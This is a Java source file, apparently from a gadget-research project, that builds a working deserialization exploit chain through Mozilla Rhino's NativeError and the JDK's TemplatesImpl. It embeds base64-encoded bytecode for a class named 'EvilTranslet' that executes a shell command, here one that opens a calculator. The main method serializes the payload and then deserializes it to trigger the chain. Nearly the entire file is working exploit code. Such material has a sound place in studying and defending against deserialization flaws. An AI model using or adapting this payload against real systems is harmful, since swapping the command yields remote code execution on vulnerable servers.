package com.trganda.gadget.rhino;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.trganda.gadget.utils.Reflections;

import org.mozilla.javascript.*;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

import javax.management.BadAttributeValueExpException;

public class MozillaRhinoExec {
    public static Object getObject() throws Exception {
        Class<?> nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
        ScriptableObject nativeError =
                (ScriptableObject) Reflections.createWithoutConstructor(nativeErrorClass);

        // 创建第一个 GetterSlot 调用 `Context#enter` 方法
        // 第一个参数为 "name" 因为 js_toString 中 ScriptableObject#getProperty 的第二个参数为 name；第三个参数设置为 4，创建的才会是
        // GetterSlot
        Object nameSlot =
            Reflections.getMethod(
                    ScriptableObject.class,
                    "getSlot",
                    String.class,
                    int.class,
                    int.class)
                .invoke(nativeError, "name", 0, 4);
        // 设定动态调用的方法为 Context#enter
        Method enterMethod = Reflections.getMethod(Context.class, "enter");
        // 创建 MemberBox
        Class<?> memberBoxErrorClass = Class.forName("org.mozilla.javascript.MemberBox");
        Object memberBox = Reflections.createWithoutConstructor(memberBoxErrorClass);
        Reflections.getMethod(memberBoxErrorClass, "init", Method.class).invoke(memberBox, enterMethod);
        Reflections.setFieldValue(nameSlot, "getter", memberBox);

        // 创建第二个 GetterSlot 调用 `TemplatesImpl#newTransformer` 方法
        // 第一个参数为 "message" 因为 js_toString 中 ScriptableObject#getProperty 的第二个参数为 message；第三个参数设置为 4，创建的才会是
        // GetterSlot
        Object messageSlot =
                Reflections.getMethod(
                                ScriptableObject.class,
                                "getSlot",
                                String.class,
                                int.class,
                                int.class)
                        .invoke(nativeError, "message", 0, 4);

        // 设定动态调用的方法为 TemplatesImpl#newTransformer
        Method templateMethod = Reflections.getMethod(TemplatesImpl.class, "newTransformer");

        // 创建 NativeJavaMethod
        NativeJavaMethod transformerJavaMethod = new NativeJavaMethod(templateMethod, "templates");
        Reflections.setFieldValue(messageSlot, "getter", transformerJavaMethod);

        // TemplatesImpl 利用链
        TemplatesImpl templatesImpl = new TemplatesImpl();
        Reflections.setFieldValue(templatesImpl, "_name", "evil");
        Reflections.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        byte[] code =
                Base64.getDecoder()
                        .decode(
                                "yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEAEUV2aWxUcmFuc2xldC5qYXZhDAAKAAsHACMMACQAJQEAEm9wZW4gLWEgY2FsY3VsYXRvcgwAJgAnAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACgBAAxFdmlsVHJhbnNsZXQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAdAAEAAQAAAAUqtwABsQAAAAEADQAAAAYAAQAAAAkAAQAOAA8AAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAABUAEAAAAAQAAQARAAEADgASAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAAaABAAAAAEAAEAEQAIABMACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw==");
        Reflections.setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});

        // 创建 NativeJavaObject
        Context context = Context.enter();
        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();
        NativeJavaObject nativeJavaObject =
                new NativeJavaObject(scriptableObject, templatesImpl, TemplatesImpl.class);
        Reflections.setFieldValue(nativeError, "prototypeObject", nativeJavaObject);

        BadAttributeValueExpException badAttributeValueExpException =
                new BadAttributeValueExpException(null);

        Reflections.setFieldValue(badAttributeValueExpException, "val", nativeError);

        return badAttributeValueExpException;
    }

    public static void main(String[] args) throws Exception {
        ObjectOutputStream oos =
                new ObjectOutputStream(Files.newOutputStream(Paths.get("target/MozillaRhinoExec.bin")));
        oos.writeObject(getObject());

        ObjectInputStream ois =
                new ObjectInputStream(Files.newInputStream(Paths.get("target/MozillaRhinoExec.bin")));
        ois.readObject();
    }
}
